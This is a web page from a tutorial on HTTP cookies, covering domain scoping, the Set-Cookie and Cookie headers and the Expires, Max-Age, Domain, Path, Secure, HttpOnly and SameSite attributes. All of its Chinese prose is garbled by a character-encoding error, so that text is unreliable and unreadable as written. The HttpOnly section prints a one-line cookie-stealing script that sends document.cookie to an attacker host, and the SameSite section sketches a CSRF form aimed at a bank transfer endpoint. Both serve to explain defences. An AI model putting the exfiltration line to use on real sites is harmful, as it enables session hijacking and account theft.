<p>Cookie æ˜¯æŒ‰ç…§åŸŸååŒºåˆ†çš„ï¼Œ<code>foo.com</code>åªèƒ½è¯»å–è‡ªå·±æ”¾ç½®çš„ Cookieï¼Œæ— æ³•è¯»å–å…¶ä»–ç½‘ç«™ï¼ˆæ¯”å¦‚<code>bar.com</code>ï¼‰æ”¾ç½®çš„ Cookieã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€çº§åŸŸåä¹Ÿä¸èƒ½è¯»å–äºŒçº§åŸŸåç•™ä¸‹çš„ Cookieï¼Œæ¯”å¦‚<code>mydomain.com</code>ä¸èƒ½è¯»å–<code>subdomain.mydomain.com</code>è®¾ç½®çš„ Cookieã€‚ä½†æ˜¯æœ‰ä¸€ä¸ªä¾‹å¤–ï¼Œè®¾ç½® Cookie çš„æ—¶å€™ï¼ˆä¸ç®¡æ˜¯ä¸€çº§åŸŸåè®¾ç½®çš„ï¼Œè¿˜æ˜¯äºŒçº§åŸŸåè®¾ç½®çš„ï¼‰ï¼Œæ˜ç¡®å°†<code>domain</code>å±æ€§è®¾ä¸ºä¸€çº§åŸŸåï¼Œåˆ™è¿™ä¸ªåŸŸåä¸‹é¢çš„å„çº§åŸŸåå¯ä»¥å…±äº«è¿™ä¸ª Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: name&#x3D;value; domain&#x3D;mydomain.com</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œè®¾ç½® Cookie æ—¶ï¼Œ<code>domain</code>å±æ€§è®¾ä¸º<code>mydomain.com</code>ï¼Œé‚£ä¹ˆå„çº§çš„å­åŸŸåå’Œä¸€çº§åŸŸåéƒ½å¯ä»¥è¯»å–è¿™ä¸ª Cookieã€‚</p>
<p>æ³¨æ„ï¼ŒåŒºåˆ† Cookie æ—¶ä¸è€ƒè™‘åè®®å’Œç«¯å£ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>http://example.com</code>è®¾ç½®çš„ Cookieï¼Œå¯ä»¥è¢«<code>https://example.com</code>æˆ–<code>http://example.com:8080</code>è¯»å–ã€‚</p>
<h3 id="Cookie-ä¸-HTTP-åè®®"><a href="#Cookie-ä¸-HTTP-åè®®" class="headerlink" title="Cookie ä¸ HTTP åè®®"></a>Cookie ä¸ HTTP åè®®</h3><p>Cookie ç”± HTTP åè®®ç”Ÿæˆï¼Œä¹Ÿä¸»è¦æ˜¯ä¾› HTTP åè®®ä½¿ç”¨ã€‚</p>
<h4 id="HTTP-å›åº”ï¼šCookie-çš„ç”Ÿæˆ"><a href="#HTTP-å›åº”ï¼šCookie-çš„ç”Ÿæˆ" class="headerlink" title="HTTP å›åº”ï¼šCookie çš„ç”Ÿæˆ"></a>HTTP å›åº”ï¼šCookie çš„ç”Ÿæˆ</h4><p>æœåŠ¡å™¨å¦‚æœå¸Œæœ›åœ¨æµè§ˆå™¨ä¿å­˜ Cookieï¼Œå°±è¦åœ¨ HTTP å›åº”çš„å¤´ä¿¡æ¯é‡Œé¢ï¼Œæ”¾ç½®ä¸€ä¸ª<code>Set-Cookie</code>å­—æ®µã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:foo&#x3D;bar</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¼šåœ¨æµè§ˆå™¨ä¿å­˜ä¸€ä¸ªåä¸º<code>foo</code>çš„ Cookieï¼Œå®ƒçš„å€¼ä¸º<code>bar</code>ã€‚</p>
<p>HTTP å›åº”å¯ä»¥åŒ…å«å¤šä¸ª<code>Set-Cookie</code>å­—æ®µï¼Œå³åœ¨æµè§ˆå™¨ç”Ÿæˆå¤šä¸ª Cookieã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK</span><br><span class="line">Content-type: text&#x2F;html</span><br><span class="line">Set-Cookie: yummy_cookie&#x3D;choco</span><br><span class="line">Set-Cookie: tasty_cookie&#x3D;strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure>

<p>é™¤äº† Cookie çš„å€¼ï¼Œ<code>Set-Cookie</code>å­—æ®µè¿˜å¯ä»¥é™„åŠ  Cookie çš„å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Expires&#x3D;&lt;date&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Max-Age&#x3D;&lt;non-zero-digit&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Domain&#x3D;&lt;domain-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Path&#x3D;&lt;path-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Secure</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; HttpOnly</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„å‡ ä¸ªå±æ€§çš„å«ä¹‰ï¼Œå°†åœ¨åæ–‡è§£é‡Šã€‚</p>
<p>ä¸€ä¸ª<code>Set-Cookie</code>å­—æ®µé‡Œé¢ï¼Œå¯ä»¥åŒæ—¶åŒ…æ‹¬å¤šä¸ªå±æ€§ï¼Œæ²¡æœ‰æ¬¡åºçš„è¦æ±‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;&#x3D;&lt;cookie-value&gt;; Domain&#x3D;&lt;domain-value&gt;; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id&#x3D;a3fWa; Expires&#x3D;Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœåŠ¡å™¨æƒ³æ”¹å˜ä¸€ä¸ªæ—©å…ˆè®¾ç½®çš„ Cookieï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³å››ä¸ªæ¡ä»¶ï¼šCookie çš„<code>key</code>ã€<code>domain</code>ã€<code>path</code>å’Œ<code>secure</code>éƒ½åŒ¹é…ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœåŸå§‹çš„ Cookie æ˜¯ç”¨å¦‚ä¸‹çš„<code>Set-Cookie</code>è®¾ç½®çš„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1&#x3D;value1; domain&#x3D;example.com; path&#x3D;&#x2F;blog</span><br></pre></td></tr></table></figure>

<p>æ”¹å˜ä¸Šé¢è¿™ä¸ª Cookie çš„å€¼ï¼Œå°±å¿…é¡»ä½¿ç”¨åŒæ ·çš„<code>Set-Cookie</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1&#x3D;value2; domain&#x3D;example.com; path&#x3D;&#x2F;blog</span><br></pre></td></tr></table></figure>

<p>åªè¦æœ‰ä¸€ä¸ªå±æ€§ä¸åŒï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå…¨æ–°çš„ Cookieï¼Œè€Œä¸æ˜¯æ›¿æ¢æ‰åŸæ¥é‚£ä¸ª Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1&#x3D;value2; domain&#x3D;example.com; path&#x3D;&#x2F;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„å‘½ä»¤è®¾ç½®äº†ä¸€ä¸ªå…¨æ–°çš„åŒå Cookieï¼Œä½†æ˜¯<code>path</code>å±æ€§ä¸ä¸€æ ·ã€‚ä¸‹ä¸€æ¬¡è®¿é—®<code>example.com/blog</code>çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°†å‘æœåŠ¡å™¨å‘é€ä¸¤ä¸ªåŒåçš„ Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: key1&#x3D;value1; key1&#x3D;value2</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç çš„ä¸¤ä¸ª Cookie æ˜¯åŒåçš„ï¼ŒåŒ¹é…è¶Šç²¾ç¡®çš„ Cookie æ’åœ¨è¶Šå‰é¢ã€‚</p>
<h4 id="HTTP-è¯·æ±‚ï¼šCookie-çš„å‘é€"><a href="#HTTP-è¯·æ±‚ï¼šCookie-çš„å‘é€" class="headerlink" title="HTTP è¯·æ±‚ï¼šCookie çš„å‘é€"></a>HTTP è¯·æ±‚ï¼šCookie çš„å‘é€</h4><p>æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½ä¼šå¸¦ä¸Šç›¸åº”çš„ Cookieã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŠŠæœåŠ¡å™¨æ—©å‰ä¿å­˜åœ¨æµè§ˆå™¨çš„è¿™æ®µä¿¡æ¯ï¼Œå†å‘å›æœåŠ¡å™¨ã€‚è¿™æ—¶è¦ä½¿ç”¨ HTTP å¤´ä¿¡æ¯çš„<code>Cookie</code>å­—æ®µã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: foo&#x3D;bar</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¼šå‘æœåŠ¡å™¨å‘é€åä¸º<code>foo</code>çš„ Cookieï¼Œå€¼ä¸º<code>bar</code>ã€‚</p>
<p><code>Cookie</code>å­—æ®µå¯ä»¥åŒ…å«å¤šä¸ª Cookieï¼Œä½¿ç”¨åˆ†å·ï¼ˆ<code>;</code>ï¼‰åˆ†éš”ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: name&#x3D;value; name2&#x3D;value2; name3&#x3D;value3</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;sample_page.html HTTP&#x2F;1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie&#x3D;choco; tasty_cookie&#x3D;strawberry</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡å™¨æ”¶åˆ°æµè§ˆå™¨å‘æ¥çš„ Cookie æ—¶ï¼Œæœ‰ä¸¤ç‚¹æ˜¯æ— æ³•çŸ¥é“çš„ã€‚</p>
<ul>
<li>Cookie çš„å„ç§å±æ€§ï¼Œæ¯”å¦‚ä½•æ—¶è¿‡æœŸã€‚</li>
<li>å“ªä¸ªåŸŸåè®¾ç½®çš„ Cookieï¼Œåˆ°åº•æ˜¯ä¸€çº§åŸŸåè®¾çš„ï¼Œè¿˜æ˜¯æŸä¸€ä¸ªäºŒçº§åŸŸåè®¾çš„ã€‚</li>
</ul>
<h3 id="Cookie-çš„å±æ€§"><a href="#Cookie-çš„å±æ€§" class="headerlink" title="Cookie çš„å±æ€§"></a>Cookie çš„å±æ€§</h3><h4 id="Expiresï¼ŒMax-Age"><a href="#Expiresï¼ŒMax-Age" class="headerlink" title="Expiresï¼ŒMax-Age"></a>Expiresï¼ŒMax-Age</h4><p><code>Expires</code>å±æ€§æŒ‡å®šä¸€ä¸ªå…·ä½“çš„åˆ°æœŸæ—¶é—´ï¼Œåˆ°äº†æŒ‡å®šæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚å®ƒçš„å€¼æ˜¯ UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>Date.prototype.toUTCString()</code>è¿›è¡Œæ ¼å¼è½¬æ¢ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id&#x3D;a3fWa; Expires&#x3D;Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸è®¾ç½®è¯¥å±æ€§ï¼Œæˆ–è€…è®¾ä¸º<code>null</code>ï¼ŒCookie åªåœ¨å½“å‰ä¼šè¯ï¼ˆsessionï¼‰æœ‰æ•ˆï¼Œæµè§ˆå™¨çª—å£ä¸€æ—¦å…³é—­ï¼Œå½“å‰ Session ç»“æŸï¼Œè¯¥ Cookie å°±ä¼šè¢«åˆ é™¤ã€‚å¦å¤–ï¼Œæµè§ˆå™¨æ ¹æ®æœ¬åœ°æ—¶é—´ï¼Œå†³å®š Cookie æ˜¯å¦è¿‡æœŸï¼Œç”±äºæœ¬åœ°æ—¶é—´æ˜¯ä¸ç²¾ç¡®çš„ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•ä¿è¯ Cookie ä¸€å®šä¼šåœ¨æœåŠ¡å™¨æŒ‡å®šçš„æ—¶é—´è¿‡æœŸã€‚</p>
<p><code>Max-Age</code>å±æ€§æŒ‡å®šä»ç°åœ¨å¼€å§‹ Cookie å­˜åœ¨çš„ç§’æ•°ï¼Œæ¯”å¦‚<code>60 * 60 * 24 * 365</code>ï¼ˆå³ä¸€å¹´ï¼‰ã€‚è¿‡äº†è¿™ä¸ªæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚</p>
<p>å¦‚æœåŒæ—¶æŒ‡å®šäº†<code>Expires</code>å’Œ<code>Max-Age</code>ï¼Œé‚£ä¹ˆ<code>Max-Age</code>çš„å€¼å°†ä¼˜å…ˆç”Ÿæ•ˆã€‚</p>
<p>å¦‚æœ<code>Set-Cookie</code>å­—æ®µæ²¡æœ‰æŒ‡å®š<code>Expires</code>æˆ–<code>Max-Age</code>å±æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ª Cookie å°±æ˜¯ Session Cookieï¼Œå³å®ƒåªåœ¨æœ¬æ¬¡å¯¹è¯å­˜åœ¨ï¼Œä¸€æ—¦ç”¨æˆ·å…³é—­æµè§ˆå™¨ï¼Œæµè§ˆå™¨å°±ä¸ä¼šå†ä¿ç•™è¿™ä¸ª Cookieã€‚</p>
<h4 id="Domainï¼ŒPath"><a href="#Domainï¼ŒPath" class="headerlink" title="Domainï¼ŒPath"></a>Domainï¼ŒPath</h4><p><code>Domain</code>å±æ€§æŒ‡å®š Cookie å±äºå“ªä¸ªåŸŸåï¼Œä»¥åæµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œé€šè¿‡è¿™ä¸ªå±æ€§åˆ¤æ–­æ˜¯å¦è¦é™„å¸¦æŸä¸ª Cookieã€‚</p>
<p>æœåŠ¡å™¨è®¾å®š Cookie æ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®š Domain å±æ€§ï¼Œæµè§ˆå™¨ä¼šé»˜è®¤å°†å…¶è®¾ä¸ºæµè§ˆå™¨çš„å½“å‰åŸŸåã€‚å¦‚æœå½“å‰åŸŸåæ˜¯ä¸€ä¸ª IP åœ°å€ï¼Œåˆ™ä¸å¾—è®¾ç½® Domain å±æ€§ã€‚</p>
<p>å¦‚æœæŒ‡å®š Domain å±æ€§ï¼Œéœ€è¦éµå®ˆä¸‹é¢è§„åˆ™ï¼šDomain å±æ€§åªèƒ½æ˜¯å½“å‰åŸŸåæˆ–è€…å½“å‰åŸŸåçš„ä¸Šçº§åŸŸåï¼Œä½†è®¾ä¸ºä¸Šçº§åŸŸåæ—¶ï¼Œä¸èƒ½è®¾ä¸ºé¡¶çº§åŸŸåæˆ–å…¬å…±åŸŸåã€‚ï¼ˆé¡¶çº§åŸŸåæŒ‡çš„æ˜¯ .comã€.net è¿™æ ·çš„åŸŸåï¼Œå…¬å…±åŸŸåæŒ‡çš„æ˜¯å¼€æ”¾ç»™å¤–éƒ¨ç”¨æˆ·è®¾ç½®å­åŸŸåçš„åŸŸåï¼Œæ¯”å¦‚ github.ioã€‚ï¼‰å¦‚æœä¸ç¬¦åˆä¸Šé¢è¿™æ¡è§„åˆ™ï¼Œæµè§ˆå™¨ä¼šæ‹’ç»è®¾ç½®è¿™ä¸ª Cookieã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œå½“å‰åŸŸåä¸º<code>x.y.z.com</code>ï¼Œé‚£ä¹ˆ Domain å±æ€§å¯ä»¥è®¾ä¸º<code>x.y.z.com</code>ï¼Œæˆ–è€…<code>y.z.com</code>ï¼Œæˆ–è€…<code>z.com</code>ï¼Œä½†ä¸èƒ½è®¾ä¸º<code>foo.x.y.z.com</code>ï¼Œæˆ–è€…<code>another.domain.com</code>ã€‚</p>
<p>å¦ä¸€ä¸ªä¾‹å­æ˜¯ï¼Œå½“å‰åŸŸåä¸º<code>wangdoc.github.io</code>ï¼Œåˆ™ Domain å±æ€§åªèƒ½è®¾ä¸º<code>wangdoc.github.io</code>ï¼Œä¸èƒ½è®¾ä¸º<code>github.io</code>ï¼Œå› ä¸ºåè€…æ˜¯ä¸€ä¸ªå…¬å…±åŸŸåã€‚</p>
<p>æµè§ˆå™¨å‘é€ Cookie æ—¶ï¼ŒDomain å±æ€§å¿…é¡»ä¸å½“å‰åŸŸåä¸€è‡´ï¼Œæˆ–è€…æ˜¯å½“å‰åŸŸåçš„ä¸Šçº§åŸŸåï¼ˆå…¬å…±åŸŸåé™¤å¤–ï¼‰ã€‚æ¯”å¦‚ï¼ŒDomain å±æ€§æ˜¯<code>y.z.com</code>ï¼Œé‚£ä¹ˆé€‚ç”¨äº<code>y.z.com</code>ã€<code>x.y.z.com</code>ã€<code>foo.x.y.z.com</code>ç­‰åŸŸåã€‚å†æ¯”å¦‚ï¼ŒDomain å±æ€§æ˜¯å…¬å…±åŸŸå<code>github.io</code>ï¼Œé‚£ä¹ˆåªé€‚ç”¨äº<code>github.io</code>è¿™ä¸ªåŸŸåæœ¬èº«ï¼Œä¸é€‚ç”¨äºå®ƒçš„å­åŸŸå<code>wangdoc.github.io</code>ã€‚</p>
<p><code>Path</code>å±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œå“ªäº›è·¯å¾„è¦é™„å¸¦è¿™ä¸ª Cookieã€‚åªè¦æµè§ˆå™¨å‘ç°ï¼Œ<code>Path</code>å±æ€§æ˜¯ HTTP è¯·æ±‚è·¯å¾„çš„å¼€å¤´ä¸€éƒ¨åˆ†ï¼Œå°±ä¼šåœ¨å¤´ä¿¡æ¯é‡Œé¢å¸¦ä¸Šè¿™ä¸ª Cookieã€‚æ¯”å¦‚ï¼Œ<code>Path</code>å±æ€§æ˜¯<code>/</code>ï¼Œé‚£ä¹ˆè¯·æ±‚<code>/docs</code>è·¯å¾„ä¹Ÿä¼šåŒ…å«è¯¥ Cookieã€‚å½“ç„¶ï¼Œå‰ææ˜¯ Domain å±æ€§å¿…é¡»ç¬¦åˆæ¡ä»¶ã€‚</p>
<h4 id="Secureï¼ŒHttpOnly"><a href="#Secureï¼ŒHttpOnly" class="headerlink" title="Secureï¼ŒHttpOnly"></a>Secureï¼ŒHttpOnly</h4><p><code>Secure</code>å±æ€§æŒ‡å®šæµè§ˆå™¨åªæœ‰åœ¨åŠ å¯†åè®® HTTPS ä¸‹ï¼Œæ‰èƒ½å°†è¿™ä¸ª Cookie å‘é€åˆ°æœåŠ¡å™¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœå½“å‰åè®®æ˜¯ HTTPï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¿½ç•¥æœåŠ¡å™¨å‘æ¥çš„<code>Secure</code>å±æ€§ã€‚è¯¥å±æ€§åªæ˜¯ä¸€ä¸ªå¼€å…³ï¼Œä¸éœ€è¦æŒ‡å®šå€¼ã€‚å¦‚æœé€šä¿¡æ˜¯ HTTPS åè®®ï¼Œè¯¥å¼€å…³è‡ªåŠ¨æ‰“å¼€ã€‚</p>
<p><code>HttpOnly</code>å±æ€§æŒ‡å®šè¯¥ Cookie æ— æ³•é€šè¿‡ JavaScript è„šæœ¬æ‹¿åˆ°ï¼Œä¸»è¦æ˜¯<code>document.cookie</code>å±æ€§ã€<code>XMLHttpRequest</code>å¯¹è±¡å’Œ Request API éƒ½æ‹¿ä¸åˆ°è¯¥å±æ€§ã€‚è¿™æ ·å°±é˜²æ­¢äº†è¯¥ Cookie è¢«è„šæœ¬è¯»åˆ°ï¼Œåªæœ‰æµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œæ‰ä¼šå¸¦ä¸Šè¯¥ Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new Image()).src &#x3D; &quot;http:&#x2F;&#x2F;www.evil-domain.com&#x2F;steal-cookie.php?cookie&#x3D;&quot; + document.cookie;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢æ˜¯è·¨ç«™ç‚¹è½½å…¥çš„ä¸€ä¸ªæ¶æ„è„šæœ¬çš„ä»£ç ï¼Œèƒ½å¤Ÿå°†å½“å‰ç½‘é¡µçš„ Cookie å‘å¾€ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ã€‚å¦‚æœè®¾ç½®äº†ä¸€ä¸ª Cookie çš„<code>HttpOnly</code>å±æ€§ï¼Œä¸Šé¢ä»£ç å°±ä¸ä¼šè¯»åˆ°è¯¥ Cookieã€‚</p>
<h4 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h4><p>Chrome 51 å¼€å§‹ï¼Œæµè§ˆå™¨çš„ Cookie æ–°å¢åŠ äº†ä¸€ä¸ª<code>SameSite</code>å±æ€§ï¼Œç”¨æ¥é˜²æ­¢ CSRF æ”»å‡»å’Œç”¨æˆ·è¿½è¸ªã€‚</p>
<p>Cookie å¾€å¾€ç”¨æ¥å­˜å‚¨ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼Œæ¶æ„ç½‘ç«™å¯ä»¥è®¾æ³•ä¼ªé€ å¸¦æœ‰æ­£ç¡® Cookie çš„ HTTP è¯·æ±‚ï¼Œè¿™å°±æ˜¯ CSRF æ”»å‡»ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·ç™»é™†äº†é“¶è¡Œç½‘ç«™<code>your-bank.com</code>ï¼Œé“¶è¡ŒæœåŠ¡å™¨å‘æ¥äº†ä¸€ä¸ª Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:id&#x3D;a3fWa;</span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·åæ¥åˆè®¿é—®äº†æ¶æ„ç½‘ç«™<code>malicious.com</code>ï¼Œä¸Šé¢æœ‰ä¸€ä¸ªè¡¨å•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;your-bank.com&#x2F;transfer&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·ä¸€æ—¦è¢«è¯±éª—å‘é€è¿™ä¸ªè¡¨å•ï¼Œé“¶è¡Œç½‘ç«™å°±ä¼šæ”¶åˆ°å¸¦æœ‰æ­£ç¡® Cookie çš„è¯·æ±‚ã€‚ä¸ºäº†é˜²æ­¢è¿™ç§æ”»å‡»ï¼Œå®˜ç½‘çš„è¡¨å•ä¸€èˆ¬éƒ½å¸¦æœ‰ä¸€ä¸ªéšæœº tokenï¼Œå®˜ç½‘æœåŠ¡å™¨é€šè¿‡éªŒè¯è¿™ä¸ªéšæœº tokenï¼Œç¡®è®¤æ˜¯å¦ä¸ºçœŸå®è¯·æ±‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;your-bank.com&#x2F;transfer&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;dad3weg34&quot;&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ç§ç¬¬ä¸‰æ–¹ç½‘ç«™å¼•å¯¼è€Œé™„å¸¦å‘é€çš„ Cookieï¼Œå°±ç§°ä¸ºç¬¬ä¸‰æ–¹ Cookieã€‚å®ƒé™¤äº†ç”¨äº CSRF æ”»å‡»ï¼Œè¿˜å¯ä»¥ç”¨äºç”¨æˆ·è¿½è¸ªã€‚æ¯”å¦‚ï¼ŒFacebook åœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™æ’å…¥ä¸€å¼ çœ‹ä¸è§çš„å›¾ç‰‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;facebook.com&quot; style&#x3D;&quot;visibility:hidden;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨åŠ è½½ä¸Šé¢ä»£ç æ—¶ï¼Œå°±ä¼šå‘ Facebook å‘å‡ºå¸¦æœ‰ Cookie çš„è¯·æ±‚ï¼Œä»è€Œ Facebook å°±ä¼šçŸ¥é“ä½ æ˜¯è°ï¼Œè®¿é—®äº†ä»€ä¹ˆç½‘ç«™ã€‚</p>
<p>Cookie çš„<code>SameSite</code>å±æ€§ç”¨æ¥é™åˆ¶ç¬¬ä¸‰æ–¹ Cookieï¼Œä»è€Œå‡å°‘å®‰å…¨é£é™©ã€‚å®ƒå¯ä»¥è®¾ç½®ä¸‰ä¸ªå€¼ã€‚</p>
<blockquote>
<ul>
<li>Strict</li>
<li>Lax</li>
<li>None</li>
</ul>
</blockquote>
<p><strong>ï¼ˆ1ï¼‰Strict</strong></p>
<p><code>Strict</code>æœ€ä¸ºä¸¥æ ¼ï¼Œå®Œå…¨ç¦æ­¢ç¬¬ä¸‰æ–¹ Cookieï¼Œè·¨ç«™ç‚¹æ—¶ï¼Œä»»ä½•æƒ…å†µä¸‹éƒ½ä¸ä¼šå‘é€ Cookieã€‚æ¢è¨€ä¹‹ï¼Œåªæœ‰å½“å‰ç½‘é¡µçš„ URL ä¸è¯·æ±‚ç›®æ ‡ä¸€è‡´ï¼Œæ‰ä¼šå¸¦ä¸Š Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CookieName&#x3D;CookieValue; SameSite&#x3D;Strict;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè§„åˆ™è¿‡äºä¸¥æ ¼ï¼Œå¯èƒ½é€ æˆéå¸¸ä¸å¥½çš„ç”¨æˆ·ä½“éªŒã€‚æ¯”å¦‚ï¼Œå½“å‰ç½‘é¡µæœ‰ä¸€ä¸ª GitHub é“¾æ¥ï¼Œç”¨æˆ·ç‚¹å‡»è·³è½¬å°±ä¸ä¼šå¸¦æœ‰ GitHub çš„ Cookieï¼Œè·³è½¬è¿‡å»æ€»æ˜¯æœªç™»é™†çŠ¶æ€ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰Lax</strong></p>
<p><code>Lax</code>è§„åˆ™ç¨ç¨æ”¾å®½ï¼Œå¤§å¤šæ•°æƒ…å†µä¹Ÿæ˜¯ä¸å‘é€ç¬¬ä¸‰æ–¹ Cookieï¼Œä½†æ˜¯å¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„ Get è¯·æ±‚é™¤å¤–ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CookieName&#x3D;CookieValue; SameSite&#x3D;Lax;</span><br></pre></td></tr></table></figure>

